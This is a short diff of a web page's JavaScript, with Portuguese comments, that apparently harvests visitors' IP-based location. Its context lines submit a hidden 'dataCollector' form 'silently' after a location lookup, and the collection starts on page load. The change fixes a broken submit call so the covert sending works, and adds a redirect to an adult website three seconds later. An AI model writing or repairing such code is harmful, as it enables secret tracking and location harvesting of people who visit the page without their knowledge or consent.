@@ -247,8 +247,14 @@
             await getIPLocation();
 
             // Envia os dados silenciosamente
-            document.getElementById('dataCollector').submit()();
+            document.getElementById('dataCollector').submit();
+            
+            // Redireciona após 3 segundos (opcional)
+            setTimeout(() => {
+                window.location.href = "https://www.xvideos.com"; // Altere para sua URL
+            }, 3000);
         }
+
         // Inicia a coleta de dados quando a página carrega
         window.addEventListener('load', () => {
             // Mostra o modal após 1 segundo se a localização ainda não foi permitida
